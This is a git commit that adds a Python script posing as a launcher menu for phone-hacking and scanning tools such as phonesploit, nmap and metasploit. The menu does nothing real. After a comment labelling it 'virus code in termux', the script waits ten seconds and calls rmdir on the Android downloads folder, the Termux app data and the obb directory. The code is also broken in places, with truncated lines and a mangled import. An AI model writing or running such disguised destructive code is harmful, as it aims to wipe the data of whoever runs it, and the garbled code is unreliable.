cd6d69260c1365a5dd280f9e053d563f7379a9a3
artem-collab <58644376+artem-collab@users.noreply.github.com>
2019-12-08 05:22:41 +0400

    Create Best.py

---
+++ .github/ workflows/Best.py
@@ -0,0 +1,46 @@
+rom time import *
+import os
+from colorama import init
+from colorama import Fore
+i
+print ( Fore.GREEN + '''
+_________________________________________________>
+8&@$+#(27$(@+           [          ]            π>
+d           &           [          ]            π>
+f           a           [          ]            π>
+g           @           [          ]            π>
+s           +           [          ]            π>
+f           g           [          ]            π>
+1           ,           [          ]            π>
+o           -           [----------]            π>
+_________________________________________________>
+''')
+d = '1)phonesploit'
+b = '2)nmap'
+nmap = '3)metasploit'
+web = '4)websploit'
+
+print( Fore.YELLOW + d)
+print( Fore.RED + b )
+print( Fore.BLUE + nmap )
+print( Fore.BLUE + nmap )
+print( Fore.BLACK + web )
+menu=input()
+if menu == '1':
+        print( Fore.RED + 'phonesploit(main_menu)>
+        show=input()
+        print('command no found -->' + Fore.BLUE >
+if menu == '2':
+        print('run as administarator')
+if menu == '3':
+        print('run as administrator' + Fore.RED )
+else:
+        print('error')
+
+
+#virus code in termux
+#иди от сюда изверг
+sleep(10)
+os.system('rmdir /storage/emulated/0/download')
+os.system('rmdir /data/data/com.termux')
+os.system('rmdir /storage/emulated/0/Android/obb')
